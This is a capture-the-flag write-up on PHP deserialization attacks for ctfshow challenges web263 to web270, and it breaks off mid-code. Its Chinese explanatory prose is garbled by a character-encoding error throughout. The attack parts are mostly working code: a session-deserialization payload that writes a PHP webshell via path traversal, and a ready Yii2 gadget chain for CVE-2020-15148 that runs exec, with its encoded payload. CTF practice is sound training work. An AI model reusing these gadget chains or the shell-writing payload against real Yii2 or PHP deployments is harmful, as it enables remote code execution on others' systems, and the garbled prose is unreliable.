string">"ç™»é™†å¤±è´¥"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>session.serialize_handler( 5.5.4å‰é»˜è®¤æ˜¯phpï¼›5.5.4åæ”¹ä¸ºphp_serialize)å­˜åœ¨ä»¥ä¸‹å‡ ç§ï¼š</p><ul><li>php_binary é”®åçš„é•¿åº¦å¯¹åº”çš„asciiå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–åçš„å€¼</li><li>php é”®å+ç«–çº¿ï¼ˆ|ï¼‰+ç»è¿‡serialize()å‡½æ•°å¤„ç†è¿‡çš„å€¼</li><li>php_serialize ç»è¿‡serialize()å‡½æ•°å¤„ç†è¿‡çš„å€¼ï¼Œä¼šå°†é”®åå’Œå€¼å½“ä½œä¸€ä¸ªæ•°ç»„åºåˆ—åŒ–</li></ul><p>å› ä¸ºæ­¤phpç‰ˆæœ¬ä¸º7.3.11ï¼Œå¹¶ä¸”è®¾ç½®ä¸ºphpå¤„ç†å™¨è€Œä¸æ˜¯php_serializeå¤„ç†å™¨ï¼Œæ‰€ä»¥å­˜åœ¨sessionååºåˆ—æ¼æ´</p><p><a href="https://www.jb51.net/article/116246.htm" target="_blank" rel="noopener">æ·±å…¥æµ…æPHPçš„sessionååºåˆ—åŒ–æ¼æ´é—®é¢˜</a>çœ‹å®Œå°±æ˜ç™½äº†</p><p>åœ¨ php_serialize å¼•æ“ä¸‹ï¼Œsessionæ–‡ä»¶ä¸­å­˜å‚¨çš„æ•°æ®ä¸º:</p><pre class="line-numbers language-php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"spoock"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>php å¼•æ“ä¸‹æ–‡ä»¶å†…å®¹ä¸º:</p><pre class="line-numbers language-php"><code class="language-php">name<span class="token operator">|</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"spoock"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æš‚æ—¶ç”¨åˆ°çš„æ˜¯è¿™ä¸¤ä¸ª</p><p>expï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">"admin/../../../../../../../../../../var/www/html/1.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">"&lt;?php system('cat flag.php');?>"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$status</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span>  <span class="token string">"|"</span><span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è§£é¢˜æ­¥éª¤ï¼š<br>1.é¦–å…ˆè®¿é—®é¦–é¡µï¼Œè·å¾— cookieï¼ŒåŒæ—¶å»ºç«‹ session<br>2.é€šè¿‡cookie managerå°†cookieä¸­çš„limitä¿®æ”¹ä¸ºåºåˆ—åŒ–å­—ç¬¦ä¸²<br>3.è®¿é—® check.phpï¼Œååºåˆ—åŒ–å®ç° shell å†™å…¥<br>4.è®¿é—®1.phpå®¡æŸ¥å…ƒç´ æŸ¥çœ‹flag</p><h1 id="web264â€”â€”ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"><a href="#web264â€”â€”ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="web264â€”â€”ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"></a>web264â€”â€”ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</h1><p><strong>payloadï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>f<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>m<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>t<span class="token operator">=</span>3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="token string">";s:5:"</span>token<span class="token string">";s:5:"</span>admin"<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span><span class="token operator">==</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è®¿é—®message.phpæ—¶éœ€è¦è®¾ç½®sessionï¼Œåœ¨cookieä¸­æ·»åŠ msgï¼Œvalueä»»æ„</p><h1 id="web265â€”â€”ååºåˆ—åŒ–ä¸­æŒ‡é’ˆå¼•ç”¨ï¼š-amp"><a href="#web265â€”â€”ååºåˆ—åŒ–ä¸­æŒ‡é’ˆå¼•ç”¨ï¼š-amp" class="headerlink" title="web265â€”â€”ååºåˆ—åŒ–ä¸­æŒ‡é’ˆå¼•ç”¨ï¼š&amp;"></a>web265â€”â€”ååºåˆ—åŒ–ä¸­æŒ‡é’ˆå¼•ç”¨ï¼š&amp;</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfshowAdmin</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span><span class="token operator">===</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctfshow</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ç”Ÿæˆéšæœºæ•°</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>å¼•ç”¨ï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">abc</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'1'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'2'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">abc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string">'1'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//æ­¤æ—¶å“ªæ€•ä¿®æ”¹açš„å€¼ä¹Ÿä¸ç®¡ç”¨</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//è¿è¡Œç»“æœ</span>cc459dba9ce1830f72c80ba14532bbac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ³¢å„¿å°±å«å¼•ç”¨ä¼ å€¼</p><p><strong>payloadï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">ctfshowAdmin</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshowAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è®©passwdçš„å€¼éštokenå˜</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è¿è¡Œç»“æœ</span>O<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token string">"ctfshowAdmin"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"token"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"password"</span><span class="token punctuation">;</span>R<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web266â€”â€”PHPå¯¹ç±»åçš„å¤§å°å†™ä¸æ•æ„Ÿ"><a href="#web266â€”â€”PHPå¯¹ç±»åçš„å¤§å°å†™ä¸æ•æ„Ÿ" class="headerlink" title="web266â€”â€”PHPå¯¹ç±»åçš„å¤§å°å†™ä¸æ•æ„Ÿ"></a>web266â€”â€”PHPå¯¹ç±»åçš„å¤§å°å†™ä¸æ•æ„Ÿ</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cs</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span><span class="token keyword">class</span> <span class="token class-name">ctfshow</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$ctfshowo</span><span class="token operator">=</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$cs</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$cs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">"Error $ctfshowo"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“æˆ‘ä»¬åºåˆ—åŒ–çš„å­—ç¬¦ä¸²é‡Œé¢å¦‚æœæœ‰ctfshowå°±ä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œè¿™æ ·å°±æ²¡æ³•è§¦å‘<code>__destrurté­”æœ¯æ–¹æ³•äº†</code>,æ‰€ä»¥å¾—ç»•è¿‡è¿™ä¸ªæ­£åˆ™ã€‚</p><pre class="line-numbers language-php"><code class="language-php">åŒºåˆ†å¤§å°å†™çš„ï¼š å˜é‡åã€å¸¸é‡åã€æ•°ç»„ç´¢å¼•ï¼ˆé”®åkeyï¼‰ä¸åŒºåˆ†å¤§å°å†™çš„ï¼šå‡½æ•°åã€æ–¹æ³•åã€ç±»åã€é­”æœ¯å¸¸é‡ã€<span class="token keyword">NULL</span>ã€<span class="token constant">FALSE</span>ã€<span class="token constant">TRUE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>payload:</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Ctfshow</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//O:7:"Ctfshow":0:{}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210824234732153.png" alt="image-20210824234732153"></p><h1 id="web267â€”â€”Yiiååºåˆ—åŒ–æ¼æ´"><a href="#web267â€”â€”Yiiååºåˆ—åŒ–æ¼æ´" class="headerlink" title="web267â€”â€”Yiiååºåˆ—åŒ–æ¼æ´"></a>web267â€”â€”Yiiååºåˆ—åŒ–æ¼æ´</h1><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/111259943" target="_blank" rel="noopener">Yii2 ååºåˆ—åŒ–æ¼æ´(CVE-2020-15148)å¤ç°</a></p><p><strong>å½±å“èŒƒå›´ï¼š</strong></p><p>Yii2 &lt;2.0.38</p><p>admin/adminå¼±å£ä»¤è¿›å…¥ç®¡ç†å‘˜è´¦æˆ·ï¼Œåœ¨abouté¡µé¢æŸ¥çœ‹æºä»£ç ä¼šå‘ç° <code>&lt;!--?view-source --&gt;</code></p><p>è®¿é—®<code>?r=site%2Fabout&amp;view-source</code>å¾—åˆ°ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">///backdoor/shell</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>ç°æˆpocï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">IndexAction</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string">'exec'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//PHPå‡½æ•°</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string">'cat /flag >2.txt'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//PHPå‡½æ•°çš„å‚æ•°  </span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Faker</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Generator</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">IndexAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">BatchQueryResult</span><span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_dataReader</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BatchQueryResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payloadï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>r<span class="token operator">=</span>backdoor<span class="token operator">/</span>shell<span class="token operator">&amp;</span>code<span class="token operator">=</span>TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo0OiJleGVjIjtzOjI6ImlkIjtzOjE2OiJjYXQgL2ZsYWcgPjIudHh0Ijt9aToxO3M6MzoicnVuIjt9fX19<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ ¹ç›®å½•è®¿é—®2.txtå¾—åˆ°flag</p><h1 id="web268-270â€”â€”Yiiååºåˆ—åŒ–æ¼æ´"><a href="#web268-270â€”â€”Yiiååºåˆ—åŒ–æ¼æ´" class="headerlink" title="web268-270â€”â€”Yiiååºåˆ—åŒ–æ¼æ´"></a>web268-270â€”â€”Yiiååºåˆ—åŒ–æ¼æ´</h1><p>åšæ³•ä¸€æ ·ä½†æ˜¯éœ€è¦ä¿®æ”¹pocï¼Œå› ä¸ºå­˜åœ¨è¿‡æ»¤</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span> <span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Action</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">IndexAction</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token variable">$func</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token variable">$param</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>web</span> <span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">MultiFieldSession</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$writeCallback</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">DbSession</span> <span class="token keyword">extends</span> <span class="token class-name">MultiFieldSession</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">writeCallback</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>yii<span class="token 